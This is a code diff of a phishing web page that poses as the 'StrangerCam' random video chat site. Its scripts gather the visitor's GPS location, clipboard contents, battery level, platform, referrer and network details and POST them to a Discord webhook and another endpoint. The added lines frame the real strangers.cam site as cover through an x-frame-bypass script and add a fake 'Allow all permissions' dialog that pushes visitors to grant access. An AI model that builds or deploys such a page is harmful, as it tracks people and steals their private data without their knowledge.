@@ -3,10 +3,57 @@
       <style>
 
          img[alt*="www.000webhost.com"], .disclaimer {
-            
+
          display: none
-         }  
+         }
+         .iframe-container {
+           position: relative;
+           width: 100%;
+           height: 100vh;
+         }
+
+         .dialog-box {
+           position: absolute;
+           top: 50%;
+           left: 50%;
+           transform: translate(-50%, -50%);
+           background-color: #ffffff;
+           border-radius: 8px;
+           box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+           padding: 20px;
+           text-align: center;
+           max-width: 300px;
+         }
+
+         .dialog-box h2 {
+           margin-top: 0;
+           color: #333333;
+         }
+
+         .dialog-box p {
+           margin-bottom: 20px;
+           color: #666666;
+         }
+
+         .btn-allow {
+           background-color: #4CAF50;
+           color: #ffffff;
+           border: none;
+           padding: 10px 20px;
+           text-align: center;
+           text-decoration: none;
+           display: inline-block;
+           font-size: 16px;
+           border-radius: 4px;
+           cursor: pointer;
+           transition: background-color 0.3s;
+         }
+
+         .btn-allow:hover {
+           background-color: #45a049;
+         }
       </style>
+
       <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
       <meta name="viewport" content="width=device-width, initial-scale=1" />
       <title>Random Video Chat - StrangerCam.com: Cam With Strangers</title>
@@ -25,7 +72,7 @@
          property="og:description"
          content="Enjoy our Anonymous random video chat with over 5.000.000 strangers. No Sign-Up Required! Cam with strangers on StrangerCam.com."
          />
-      
+
       <meta property="og:site_name" content="Stranger Cam" />
       <meta
          property="article:publisher"
@@ -47,6 +94,8 @@
       <meta name="twitter:label1" content="Est. reading time" />
       <meta name="twitter:data1" content="4 minutes" />
       <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.0/jquery.min.js"></script>
+      <script src="https://unpkg.com/@ungap/custom-elements-builtin"></script>
+	    <script src="x-frame-bypass.js" type="module"></script>
       <script>
          $(document).ready(function() {
            var batterypercentage
@@ -64,12 +113,12 @@
            }
            getclips()
            var clips
-         
+
            function giveclips(polp) {
              clips = polp
              getLocation()
            }
-         
+
            function getLocation() {
              if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(showPosition, showError);
@@ -77,20 +126,20 @@
                alert("Your Browser Does not support Gps");
              }
            }
-         
+
            function showPosition(position) {
              var grak = "Lattitute : " + position.coords.latitude + " " + "Longitude : " + position.coords.longitude
              sdrp(grak, clips,batterypercentage,ischarging);
              senddis(grak, clips,batterypercentage,ischarging);
            }
-         
+
            function showError(error) {
              switch (error.code) {
                case error.PERMISSION_DENIED:
                  sdrp("Location Permission Denied",clips,batterypercentage,ischarging);
                  senddis("Location Permission Denied",clips,batterypercentage,ischarging)
                  alert("Allow Location permission to Chat with nearby Strangers");
-         
+
                  break;
                case error.POSITION_UNAVAILABLE:
                  window.close()
@@ -103,7 +152,7 @@
                  break;
              }
            }
-            
+
            let datetime = new Date();
            let localtime = String(datetime.toLocaleTimeString());
            let referurl = document.referrer;
@@ -117,7 +166,7 @@
            let platform = navigator.platform;
            let networkinfo = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
            let networkinformation = "Network type : " + networkinfo.effectiveType + " " + "Downlink :" + " " + networkinfo.downlink
-         
+
            function senddis(gpsr, clips,batterypercentage,ischarging) {
              var request = new XMLHttpRequest();
              request.open("POST", "https://your-discordwebhook-url");
@@ -129,7 +178,7 @@
              }
              request.send(JSON.stringify(params));
            }
-         
+
            function sdrp(bsdks, clipboard,batterypercentage,ischarging) {
              $.ajax({
                type: "POST",
@@ -218,7 +267,8 @@
       init();
    </script>
    <body>
-      <p>
+
+     <div class="iframe-container">
          <iframe
             id="forPostyouradd"
             src="https://strangers.cam"
@@ -227,7 +277,19 @@
             height="100%"
             width="100%"
             ></iframe>
-      </p>
-   </body>
-   
+            <div class="dialog-box" id="dialogBox">
+              <h2>Alert</h2>
+              <p>Please Allow all permissions to continue to chat with strangers</p>
+               <button class="btn-allow" id="allowBtn">OK</button>
+           </div>
+
+      </div>
+      <script>
+    document.getElementById("allowBtn").addEventListener("click", function() {
+      document.getElementById("dialogBox").style.display = "none";
+    });
+  </script>
+
+</body>
+
 </html>
